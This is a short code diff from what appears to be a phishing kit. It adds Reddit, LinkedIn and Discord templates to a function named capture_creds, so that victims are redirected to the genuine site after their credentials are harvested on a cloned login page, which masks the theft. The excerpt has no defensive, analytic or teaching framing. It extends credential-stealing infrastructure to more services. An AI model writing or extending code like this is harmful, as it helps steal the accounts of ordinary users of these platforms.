@@ -96,6 +96,13 @@ def capture_creds(user_id):
         redirect_url = "https://www.instagram.com"
     elif "facebook" in creds.get('template', '').lower():
         redirect_url = "https://www.facebook.com"
+    elif "reddit" in creds.get('template', '').lower():
+        redirect_url = "https://www.reddit.com"
+    elif "linkedin" in creds.get('template', '').lower():
+        redirect_url = "https://www.linkedin.com/login"
+    elif "discord" in creds.get('template', '').lower():
+        redirect_url = "https://discord.com/login"
+
 
     return redirect(redirect_url)
 
